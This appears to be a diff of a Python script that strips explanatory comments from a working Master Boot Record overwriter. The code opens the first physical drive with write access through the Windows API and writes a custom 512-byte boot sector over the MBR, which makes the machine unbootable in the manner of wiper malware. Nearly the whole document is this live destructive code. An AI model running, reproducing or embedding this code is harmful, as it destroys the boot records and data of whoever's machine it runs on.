@@ -1,25 +1,13 @@
-# This script might not work in some VMs
 
-# To start, we will need to import libraries that can interact with the Windows API from Python.
-# A common choice for this is pywin32.
-from win32file import * # Features CreateFileW, a function that will be used
-from win32api import *  # CloseHandle, Sleep etc.
-from win32gui import *  # GDI functions, unused, however always great to import
-from win32con import *  # Constants like GENERIC_READ etc
-from win32ui import *   # Object oriented Windows API objects.
-import sys # Used to exit the current process. We might use ExitProcess(0), however this is more pythonic.
+from win32file import * 
+from win32api import * 
+from win32gui import *  
+from win32con import *  
+from win32ui import *   
+import sys 
 
-# Now let's begin the overwriting!
-# First we will need to create a handle to the boot sector. This is the reason why we're using CreateFileW.
-
-# Create a handle to the Master Boot Record!
-# We will be using GENERIC_WRITE in order to gain write permissions, and FILE_SHARE_READ | FILE_SHARE_WRITE
-# to allow other applications to use the Master Boot Record while we are using it.
 hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
 					  0, 0)
-
-# now then, how do we make a bootable program? We will need to go very low level, into assembly.
-# you can go into boot.asm to veiw such
 buffer = bytes([
   # boot sector data goes here
 	0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43, 
@@ -56,9 +44,6 @@ buffer = bytes([
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 ])
 
-# Overwrite the Master Boot Record!
 bytes_written = WriteFile(hDevice, buffer, None)
 print("Wrote", bytes_written, "i")
-
-# Release the memory allocated to the handle
 CloseHandle(hDevice)
